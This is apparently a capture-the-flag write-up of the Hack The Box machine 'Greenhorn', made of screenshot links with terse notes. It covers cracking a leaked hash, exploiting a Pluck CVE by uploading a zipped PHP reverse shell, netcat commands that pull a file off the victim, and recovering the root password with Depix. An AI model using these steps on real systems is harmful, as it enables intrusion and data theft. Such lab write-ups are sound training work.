![image 73.png](assets/Greenhorn/image%2073.png)
  
whatweb shows DNS name
![image 1 40.png](assets/Greenhorn/image%201%2040.png)
  
greenhorn page
![image 2 40.png](assets/Greenhorn/image%202%2040.png)
  
Nginx 1.18.0 used on web server
![image 3 34.png](assets/Greenhorn/image%203%2034.png)
  
Directory and subdomain fuzzing had nothing
![image 4 30.png](assets/Greenhorn/image%204%2030.png)
  
bottom of the page shows it’s powered by “pluck”
![image 5 29.png](assets/Greenhorn/image%205%2029.png)
  
pluck login page with version number as well
- version 4.7.18
![image 6 25.png](assets/Greenhorn/image%206%2025.png)
  
going to port 3000 shows another service being run
- Gitea version 1.21.11
![image 7 24.png](assets/Greenhorn/image%207%2024.png)
  
In the greenhorn repository, there’s a password hash
![image 8 21.png](assets/Greenhorn/image%208%2021.png)
  
crack the hash?
![image 9 21.png](assets/Greenhorn/image%209%2021.png)
cracked that hash
![image 10 16.png](assets/Greenhorn/image%2010%2016.png)
  
explore tab has a users section
![image 11 15.png](assets/Greenhorn/image%2011%2015.png)
  
didn’t work :(
![image 12 11.png](assets/Greenhorn/image%2012%2011.png)
  
iloveyou1 worked on the port 80 login page
![image 13 11.png](assets/Greenhorn/image%2013%2011.png)
  
easy money
![image 14 10.png](assets/Greenhorn/image%2014%2010.png)
  
  
looking up the pluck version number gives us CVE-2023-50564
- unauthenticated file upload
- upload a zip file containing a PHP shell
https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC
  
create a PHP reverse shell then zip it using “zip -r payload.zip shell.php”
- change all of the [poc.py](http://poc.py) stuff to fit greenhorn
    
    - hostnames to greenhorn.htb
    
    - username and password
    
  
![image 15 9.png](assets/Greenhorn/image%2015%209.png)
  
the same password works for junior
- found junior from looking at the home directory
![image 16 7.png](assets/Greenhorn/image%2016%207.png)
  
Transfer OpenVAS.pdf from victim machine using netcat
- On the receiving machine: nc -lvnp [port] > outfile
- On the sending machine: nc [ip address of receiver] [port] < infile
  
![image 17 5.png](assets/Greenhorn/image%2017%205.png)
  
![image 18 5.png](assets/Greenhorn/image%2018%205.png)
- can unblur using depix
  
extract the png of the blur by using an online tool
![image 19 4.png](assets/Greenhorn/image%2019%204.png)
![image 20 4.png](assets/Greenhorn/image%2020%204.png)
  
![image 21 4.png](assets/Greenhorn/image%2021%204.png)
- running depix
https://github.com/spipm/Depix
- refer to above to see the console command syntax
  
root pass: sidefromsidetheothersidesidefromsidetheotherside
![image 22 4.png](assets/Greenhorn/image%2022%204.png)
this box sucks